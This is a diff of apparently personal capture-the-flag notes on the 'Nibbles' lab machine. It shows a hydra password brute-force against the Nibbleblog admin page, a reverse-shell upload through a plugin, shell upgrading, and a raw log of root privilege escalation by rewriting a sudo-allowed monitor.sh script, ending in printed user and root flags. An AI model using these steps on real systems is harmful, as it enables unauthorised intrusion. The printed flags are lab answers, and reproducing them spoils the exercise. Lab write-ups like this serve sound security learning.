@@ -316,5 +316,117 @@ https://github.com/danielmiessler/SecLists
 
 try rockyou-50.txt which is just 10000 words instead of rockyou which contains 14 million passwords
 
+hydra -l admin -P http://nbbles http-post -req */nibbleblog/admin.php 
 
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md
+
+![](20230505140506.png)
+
+nibbleblog/content/private/plugins/my_image
+
+$ whoami
+nibbler
+
+got reverse shell
+
+$ cat user.txt
+5d5b5b1d39c06f12abff183bea54ce48
+
+User nibbler may run the following commands on Nibbles:
+    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+
+upgrading shell
+
+ python3 -c 'import pty;pty.spawn("/bin/bash")'
+ ctrl + z
+
+ stty raw -echo
+
+ reset
+
+ echo "os.system('/bin/bash')" > monitor.sh
+
+  sudo /home/nibbler/personal/stuff/monitor.sh
+
+      (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
+nibbler@Nibbles:/$ cd personal
+cd personal
+bash: cd: personal: No such file or directory
+nibbler@Nibbles:/$ cd home
+cd home
+nibbler@Nibbles:/home$ cd personal
+cd personal
+bash: cd: personal: No such file or directory
+nibbler@Nibbles:/home$ ls -al
+ls -al
+total 12
+drwxr-xr-x  3 root    root    4096 Dec 10  2017 .
+drwxr-xr-x 23 root    root    4096 Dec 15  2020 ..
+drwxr-xr-x  4 nibbler nibbler 4096 May  5 14:37 nibbler
+nibbler@Nibbles:/home$ cd nibbler
+cd nibbler
+nibbler@Nibbles:/home/nibbler$ cd personal
+cd personal
+nibbler@Nibbles:/home/nibbler/personal$ cd stuff
+cd stuff
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "echo 'os.system('/bin/bash')'" > monitor.sh
+<er/personal/stuff$ echo "echo 'os.system('/bin/bash                       ')'" > monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+cat monitor.sh
+echo 'os.system('/bin/bash')'
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+<er/personal/stuff$ sudo /home/nibbler/personal/stuf                       f/monitor.sh
+sudo: /home/nibbler/personal/stuff/monitor.sh: command not found
+nibbler@Nibbles:/home/nibbler/personal/stuff$ whoami
+whoami
+nibbler
+nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
+chmod +x monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+<er/personal/stuff$ sudo /home/nibbler/personal/stuf                       f/monitor.sh
+os.system(/bin/bash)
+nibbler@Nibbles:/home/nibbler/personal/stuff$ whoami
+whoami
+nibbler
+nibbler@Nibbles:/home/nibbler/personal/stuff$ rm -rf monitor.sh
+rm -rf monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "os.system('/bin/bash')" > monitor.sh
+<er/personal/stuff$ echo "os.system('/bin/bash')" >                        monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ chmod +x monitor.sh
+chmod +x monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+<er/personal/stuff$ sudo /home/nibbler/personal/stuf                       f/monitor.sh
+/home/nibbler/personal/stuff/monitor.sh: 1: /home/nibbler/personal/stuff/monitor.sh: Syntax error: word unexpected (expecting ")")
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+cat monitor.sh
+os.system('/bin/bash')
+nibbler@Nibbles:/home/nibbler/personal/stuff$ echo "/bin/sh -i" > monitor.sh
+echo "/bin/sh -i" > monitor.sh
+nibbler@Nibbles:/home/nibbler/personal/stuff$ cat monitor.sh
+cat monitor.sh
+/bin/sh -i
+nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo /home/nibbler/personal/stuff/monitor.sh
+<er/personal/stuff$ sudo /home/nibbler/personal/stuf                       f/monitor.sh
+# whoami
+whoami
+root
+# cd root
+cd root
+/bin/sh: 2: cd: can't cd to root
+# cd /root
+cd /root
+# cat root.txt
+cat root.txt
+049f7e3cccfa272bf9c786e052f35d1e
+
+
+
+
+
+# Learning
+
+use recon moduel for initial enumeration
+use burpsuite on web
+always look for cutom programs
+look for a way to upload a shell.
 
